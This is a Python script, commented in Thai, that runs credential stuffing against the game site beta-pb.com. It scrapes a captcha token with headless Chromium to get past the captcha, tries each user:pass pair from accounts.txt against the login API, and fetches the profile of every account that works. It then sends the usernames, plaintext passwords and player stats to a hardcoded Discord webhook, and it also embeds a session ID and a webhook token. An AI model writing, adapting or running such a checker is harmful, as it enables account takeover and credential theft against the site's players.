import requests
import time
import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

# ================== 🔥 ตั้งค่าฮาร์ดโค้ด ==================
SESSION_ID = "d9c5d8c81b3012339001b6ffea85abcdaeeb10806a7891568086c70cb854084"
WEBHOOK_URL = "https://discord.com/api/webhooks/1525105752497324072/TU7mNMV_qhmXwuwcooDrJPH8i50YOM4qCny55kI4dko9u-ZN65I6-QQsuJ0n8NtrEGSy"  # 👈 เปลี่ยนเป็นของคุณ

def get_captcha_token():
    """ใช้ Selenium + Chromium ดึง captcha_token จากหน้าเว็บ"""
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.binary_location = "/usr/bin/chromium"
    
    driver = None
    try:
        driver = webdriver.Chrome(options=options)
        driver.get("https://beta-pb.com")
        wait = WebDriverWait(driver, 10)
        
        token = None
        
        # วิธีที่ 1: หาจาก input name="captcha_token"
        try:
            elem = wait.until(EC.presence_of_element_located((By.NAME, "captcha_token")))
            token = elem.get_attribute("value")
            if token:
                print(f"   ✅ พบ token ใน input: {token[:50]}...")
                return token
        except:
            pass
        
        # วิธีที่ 2: หาจาก JavaScript variable
        try:
            token = driver.execute_script("return window.captcha_token || ''")
            if token:
                print(f"   ✅ พบ token ใน JavaScript: {token[:50]}...")
                return token
        except:
            pass
        
        # วิธีที่ 3: หาจาก data attribute
        try:
            elem = driver.find_element(By.CSS_SELECTOR, "[data-captcha-token]")
            token = elem.get_attribute("data-captcha-token")
            if token:
                print(f"   ✅ พบ token ใน data attribute: {token[:50]}...")
                return token
        except:
            pass
        
        print("   ❌ ไม่พบ captcha_token ในหน้าเว็บ")
        return None
        
    except Exception as e:
        print(f"   ⚠️ get_captcha_token error: {e}")
        return None
    finally:
        if driver:
            driver.quit()

def check_account(username, password, session, captcha_token):
    """ใช้ session_id ที่มีอยู่ เช็คบัญชี user:pass"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "x-api-csrf-test": "1",
        "Referer": "https://beta-pb.com/",
        "Origin": "https://beta-pb.com",
        "X-Requested-With": "XMLHttpRequest"
    }
    payload = {
        "username": username,
        "password": password,
        "remember_me": False,
        "captcha_token": captcha_token or "",
        "language": "th"
    }
    return session.post("https://beta-pb.com/api/session/login", json=payload, headers=headers)

def get_profile(session):
    """ดึงโปรไฟล์ผู้เล่นจาก API"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Referer": "https://beta-pb.com/dashboard",
    }
    resp = session.get("https://beta-pb.com/api/Player/GetPlayerOverview", headers=headers)
    if resp.status_code == 200:
        return resp.json()
    return None

def send_embed(username, password, profile):
    """ส่ง Embed ไป Discord"""
    name = profile.get('nickname') or profile.get('username') or profile.get('name') or username
    rank = profile.get('rank') or profile.get('level') or profile.get('role') or 'ไม่พบ'
    rank_id = profile.get('rankId') or ''
    
    embed = {
        "title": "✅ พบบัญชีที่ใช้งานได้",
        "color": 3066993,
        "fields": [
            {"name": "👤 ชื่อผู้ใช้", "value": name, "inline": True},
            {"name": "🔑 รหัสผ่าน", "value": password, "inline": True},
            {"name": "🎖️ ยศ", "value": rank, "inline": True}
        ],
        "footer": {"text": "ระบบตรวจสอบบัญชี"}
    }
    
    if rank_id:
        embed["thumbnail"] = {"url": f"https://media.beta-pb.com/ranks/{rank_id}.png"}
    
    # สถิติเพิ่มเติม
    stats = []
    if profile.get('exp'):
        stats.append({"name": "💰 EXP", "value": str(profile['exp']), "inline": True})
    if profile.get('kd'):
        stats.append({"name": "⚔️ K/D", "value": str(profile['kd']), "inline": True})
    if profile.get('winRate'):
        stats.append({"name": "🏆 อัตราชนะ", "value": str(profile['winRate']), "inline": True})
    if profile.get('money'):
        stats.append({"name": "💵 เงิน", "value": str(profile['money']), "inline": True})
    if profile.get('mvp'):
        stats.append({"name": "⭐ MVP", "value": str(profile['mvp']), "inline": True})
    
    if stats:
        embed["fields"].extend(stats)
    
    try:
        resp = requests.post(WEBHOOK_URL, json={"embeds": [embed]})
        if resp.status_code == 204:
            print(f"   📨 ส่ง Embed สำเร็จ: {name}")
        else:
            print(f"   ⚠️ ส่งไม่สำเร็จ (HTTP {resp.status_code})")
    except Exception as e:
        print(f"   ❌ Discord Error: {e}")

def main():
    print("🚀 เริ่มตรวจสอบบัญชี beta-pb.com...")
    print(f"🔗 Webhook: {WEBHOOK_URL[:50]}...")
    
    # 1. ดึง captcha_token
    print("🔍 กำลังดึง captcha_token...")
    captcha_token = get_captcha_token()
    if not captcha_token:
        print("❌ ไม่สามารถดึง captcha_token ได้")
        print("💡 ลองรันใหม่ หรือตรวจสอบว่าเว็บ beta-pb.com เปิดอยู่")
        return
    print(f"✅ ได้ captcha_token: {captcha_token[:80]}...")
    
    # 2. อ่านไฟล์ accounts.txt
    try:
        with open("accounts.txt", "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and ":" in l]
    except FileNotFoundError:
        print("❌ ไม่พบไฟล์ accounts.txt")
        print("💡 สร้างไฟล์ accounts.txt และใส่ user:pass ทีละบรรทัด")
        return
    
    if not lines:
        print("❌ ไม่มีบัญชีใน accounts.txt")
        return
    
    # 3. สร้าง session หลัก
    main_session = requests.Session()
    main_session.cookies.set("session_id", SESSION_ID, domain="beta-pb.com")
    
    total = len(lines)
    success_count = 0
    
    # 4. วนลูปตรวจสอบบัญชี
    for idx, line in enumerate(lines, 1):
        username, password = line.split(":", 1)
        print(f"\n[{idx}/{total}] ทดสอบ: {username}")
        
        resp = check_account(username, password, main_session, captcha_token)
        
        if resp.status_code == 200:
            data = resp.json()
            if 'error_code' not in data and 'error' not in data and data.get('success') != False:
                print(f"   ✅ เข้าได้!")
                profile = get_profile(main_session)
                if profile:
                    send_embed(username, password, profile)
                    success_count += 1
                else:
                    print("   ⚠️ ไม่สามารถดึงโปรไฟล์ได้")
                    send_embed(username, password, {"nickname": username})
                    success_count += 1
            else:
                error_msg = data.get('error_code') or data.get('error') or 'Unknown'
                print(f"   ❌ เข้าไม่ได้: {error_msg}")
        else:
            print(f"   ❌ HTTP Error: {resp.status_code}")
        
        time.sleep(0.5)  # ป้องกัน rate limit
    
    print(f"\n🏁 เสร็จสิ้น! พบ {success_count} บัญชีที่ใช้งานได้ จากทั้งหมด {total}")

if __name__ == "__main__":
    main()
